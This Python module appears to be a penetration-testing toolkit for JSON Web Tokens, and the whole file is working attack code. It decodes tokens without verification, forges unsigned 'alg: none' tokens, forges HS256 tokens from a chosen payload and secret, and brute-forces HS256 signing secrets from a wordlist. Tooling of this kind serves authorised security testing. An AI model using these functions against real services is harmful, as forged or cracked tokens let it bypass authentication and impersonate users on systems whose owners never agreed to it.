"""JWT Toolkit — decode, analyze, crack, forge JSON Web Tokens."""

import json, base64, hmac, hashlib, time


def jwt_decode(token):
    """Decode a JWT without verification. Returns header, payload, signature."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return "Not a valid JWT (needs 3 parts)"

        def _b64decode(s):
            s += "=" * (4 - len(s) % 4)
            return json.loads(base64.urlsafe_b64decode(s))

        header = _b64decode(parts[0])
        payload = _b64decode(parts[1])
        sig = parts[2]
        return json.dumps({"header": header, "payload": payload, "signature": sig[:20] + "..."}, indent=2)
    except Exception as e:
        return f"JWT decode error: {e}"


def jwt_forge_none(payload_json):
    """Forge a JWT with alg:none (no signature)."""
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    body = base64.urlsafe_b64encode(json.dumps(payload_json).encode()).rstrip(b"=").decode()
    return f"{header}.{body}."


def jwt_forge_hs256(payload_json, secret):
    """Forge a JWT with HS256 signing."""
    header_b64 = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    body_b64 = base64.urlsafe_b64encode(json.dumps(payload_json).encode()).rstrip(b"=").decode()
    sig = (
        base64.urlsafe_b64encode(
            hmac.new(secret.encode(), f"{header_b64}.{body_b64}".encode(), hashlib.sha256).digest()
        )
        .rstrip(b"=")
        .decode()
    )
    return f"{header_b64}.{body_b64}.{sig}"


def jwt_crack(token, wordlist_path="~/wordlists/jwt-secrets.txt"):
    """Try to crack a JWT secret using a wordlist."""
    import os

    path = os.path.expanduser(wordlist_path)
    if not os.path.exists(path):
        return f"Wordlist not found: {path}"
    parts = token.split(".")
    if len(parts) != 3:
        return "Invalid JWT"
    header_b64, body_b64, sig_b64 = parts
    msg = f"{header_b64}.{body_b64}"
    try:
        target_sig = base64.urlsafe_b64decode(sig_b64 + "==")
    except:
        return "Invalid signature encoding"
    with open(path) as f:
        for line in f:
            secret = line.strip()
            if not secret:
                continue
            computed = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).digest()
            if hmac.compare_digest(computed, target_sig):
                return f"SECRET FOUND: {secret}"
    return "Secret not found in wordlist"
